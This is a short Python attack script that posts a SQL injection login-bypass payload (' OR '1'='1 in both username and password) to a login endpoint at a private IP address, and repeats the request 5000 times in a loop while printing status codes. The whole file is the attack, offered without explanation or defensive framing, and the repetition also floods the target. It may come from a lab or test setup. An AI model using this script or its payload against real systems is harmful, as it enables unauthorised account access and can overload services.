import requests

# Target URL
url = "http://192.168.129.1:5000/login"

# SQL Injection payload
payload = {
    "username": "' OR '1'='1",
    "password": "' OR '1'='1"
}

# Number of requests to send
num_requests = 5000

for i in range(num_requests):
    # try:
    response = requests.post(url, data=payload)
    print(f"Request {i+1}: Status Code = {response.status_code}")
# except Exception as e:
#     print(f"Request {i+1}: Failed with error - {e}")